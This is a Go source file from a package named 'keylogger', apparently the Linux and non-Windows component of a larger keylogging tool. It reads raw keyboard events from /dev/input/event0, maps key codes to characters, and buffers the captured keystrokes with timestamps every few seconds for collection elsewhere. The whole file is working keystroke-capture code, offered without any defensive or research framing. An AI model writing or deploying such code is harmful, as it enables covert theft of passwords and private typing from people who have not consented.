//go:build !windows

package keylogger

import (
	"os"
	"time"
)

var (
	keyBuffer      string
	lastWindow     string
	lastKeyTime    time.Time
	keyFlushPeriod = 3 * time.Second
)

func platformKeylogger() {
	input, err := os.OpenFile("/dev/input/event0", os.O_RDONLY, 0644)
	if err != nil {
		return
	}
	defer input.Close()

	buffer := make([]byte, 24)
	ticker := time.NewTicker(keyFlushPeriod)

	go func() {
		for range ticker.C {
			flushKeyBuffer()
		}
	}()

	for {
		_, err := input.Read(buffer)
		if err != nil {
			continue
		}

		eventType := int(buffer[16]) | int(buffer[17])<<8
		code := int(buffer[18]) | int(buffer[19])<<8
		value := int(buffer[20]) | int(buffer[21])<<8 | int(buffer[22])<<16 | int(buffer[23])<<24

		if eventType == 0x01 && value == 1 {
			key := getLinuxKeyString(code)
			if key != "" {
				lastKeyTime = time.Now()

				// If special key, flush
				if key == "ENTER" || key == "SPACE" || key == "TAB" {
					keyBuffer += " " // For SPACE etc.
					flushKeyBuffer()
					continue
				}

				keyBuffer += key
			}
		}
	}
}

func flushKeyBuffer() {
	if keyBuffer == "" {
		return
	}

	addToBuffer(KeyLog{
		Key:      keyBuffer,
		Window:   "Linux Window",
		Time:     lastKeyTime,
		KeyState: "pressed",
	})
	keyBuffer = ""
}

func getLinuxKeyString(code int) string {
	keyMap := map[int]string{
		1: "ESC", 2: "1", 3: "2", 4: "3", 5: "4",
		6: "5", 7: "6", 8: "7", 9: "8", 10: "9",
		11: "0", 12: "-", 13: "=", 14: "BKSP", 15: "TAB",
		16: "Q", 17: "W", 18: "E", 19: "R", 20: "T",
		21: "Y", 22: "U", 23: "I", 24: "O", 25: "P",
		26: "[", 27: "]", 28: "ENTER", 29: "LCTRL", 30: "A",
		31: "S", 32: "D", 33: "F", 34: "G", 35: "H",
		36: "J", 37: "K", 38: "L", 39: ";", 40: "'",
		41: "`", 42: "LSHIFT", 43: "\\", 44: "Z", 45: "X",
		46: "C", 47: "V", 48: "B", 49: "N", 50: "M",
		51: ",", 52: ".", 53: "/", 54: "RSHIFT", 55: "*",
		56: "LALT", 57: "SPACE",
	}
	return keyMap[code]
}
